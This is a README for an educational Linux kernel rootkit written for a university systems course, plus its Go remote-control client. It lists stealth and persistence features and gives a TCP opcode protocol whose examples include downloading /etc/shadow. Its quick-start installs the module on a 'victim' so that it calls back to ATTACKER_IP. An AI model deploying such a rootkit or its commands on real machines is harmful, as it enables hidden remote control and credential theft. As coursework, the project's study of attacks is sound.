# epirootkit

Educational rootkit developed for EPITA's SYS2 course. For a full user manual,
view [user-manual.pdf](user-manual.pdf)

![](https://github.com/Nvim/epirootkit/blob/master/img/exec_tab.png)

## Overview

This project is composed of a Linux kernel module rootkit, and of a
remote-controlled TUI client. The rootkit targets kernel versions between
`5.4.0-26` and `5.7`.


### Kernel module

The rootkit showcases many persistence and stealth mechanisms:

- **Syscall hooking** via `ftrace` API
- **Kernel module hiding** from loaded modules list
- **Directory entry filtering** (hiding "rootkit" prefixed files/directories)
- **Remote command execution** (both synchronous and asynchronous)
- **File upload and download** capabilities
- **Lock/Unlock mechanism** with password authentication
- **Persistence** across reboots

### Attacking Program

The attacking program is written in Go 1.24+. The terminal UI is built using
[Bubbletea](https://github.com/charmbracelet/bubbletea), alongside
[Bubbles](https://github.com/charmbracelet/bubbles) for reusable UI components
and [Lipgloss](https://github.com/charmbracelet/lipgloss) for styling
primitives . No external dependencies beyond the Charm ecosystem were
required. Go's native concurrency primitives (channels, contexts) handle all
socket communication and threading needs.

#### Key Features

- **Non-blocking operations**: All commands run asynchronously with loading indicators
- **Thread-safe socket access**: Single socket accessed via shared channel
- **Connection state management**: Automatic reconnection on failure
- **4 UI tabs**:
  - `Exec` — Remote command execution with stdout/stderr paging
  - `Hide/Lock` — Toggle syscall hooks and authentication lock
  - `Upload` — Transfer local files to the victim (saved in `/rootkit/uploaded/`)
  - `Download` — Retrieve any file from the victim

#### Communication Protocol

Simple opcode-based text protocol over TCP:

```
[opcode] [arguments]
```

Examples:
```
0 whoami          # Execute sync
2                 # Toggle hide
4 /etc/shadow     # Download file
```

## Requirements

- **Target Machine**: Ubuntu 20.04 LTS with Linux kernel `5.4.0-26` (must be < 5.7)
- **Virtualization**: KVM/QEMU with Virt-Manager recommended
- **Attacking Machine**: Any system with Go 1.24+

## Quick Start

```bash
# On victim machine (requires correct kernel)
cd rootkit
./insert.sh [ATTACKER_IP] [PORT]

# On attacking machine  
cd attacking_program/cli
make run
